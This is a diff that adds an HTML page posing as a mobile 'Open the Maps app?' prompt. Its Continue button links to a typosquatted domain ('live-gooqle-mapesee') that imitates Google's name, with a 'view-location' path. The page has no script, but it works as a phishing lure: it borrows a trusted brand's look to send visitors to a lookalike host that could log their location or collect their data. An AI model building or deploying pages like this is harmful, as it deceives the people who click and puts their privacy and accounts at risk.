@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Maps Popup</title>
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Arial, Helvetica, sans-serif;
+}
+
+/* BACKGROUND IMAGE */
+
+body{
+height:100vh;
+width:100%;
+background-image:url("https://raw.githubusercontent.com/emeraldperez00-cloud/images/refs/heads/main/Image.jfif");
+background-size:cover;
+background-position:center;
+background-repeat:no-repeat;
+display:flex;
+align-items:center;
+justify-content:center;
+}
+
+/* POPUP CONTAINER */
+
+.popup{
+background:white;
+border-radius:20px;
+padding:28px;
+width:92%;
+max-width:420px;
+text-align:center;
+box-shadow:0 20px 50px rgba(0,0,0,0.35);
+
+/* slide animation */
+animation:slideUp 0.5s ease;
+}
+
+/* ICON */
+
+.popup img{
+width:52px;
+margin-bottom:12px;
+}
+
+/* TITLE */
+
+.popup h2{
+font-size:20px;
+margin-bottom:8px;
+}
+
+/* TEXT */
+
+.popup p{
+font-size:14px;
+color:#666;
+margin-bottom:22px;
+}
+
+/* BUTTON AREA */
+
+.buttons{
+display:flex;
+justify-content:space-between;
+gap:12px;
+}
+
+/* BUTTON STYLE */
+
+.buttons a{
+flex:1;
+padding:13px;
+border-radius:25px;
+font-size:14px;
+text-decoration:none;
+display:flex;
+align-items:center;
+justify-content:center;
+}
+
+
+
+/* RIGHT BUTTON */
+
+.primary{
+background:#1a73e8;
+color:white;
+}
+
+/* ANIMATION */
+
+@keyframes slideUp{
+
+from{
+transform:translateY(80px);
+opacity:0;
+}
+
+to{
+transform:translateY(0);
+opacity:1;
+}
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="popup">
+
+<img src="https://raw.githubusercontent.com/emeraldperez00-cloud/images/refs/heads/main/ax8969u2u.png">
+
+<h2>Open the Maps app?</h2>
+
+<p>Get real-time navigation and more in the Maps app</p>
+
+<div class="buttons">
+
+
+
+<a href="https://live-gooqle-mapesee.1-a-e.com/view-location/4569" class="primary">
+Continue
+</a>
+
+</div>
+
+</div>
+
+</body>
+
+</html>
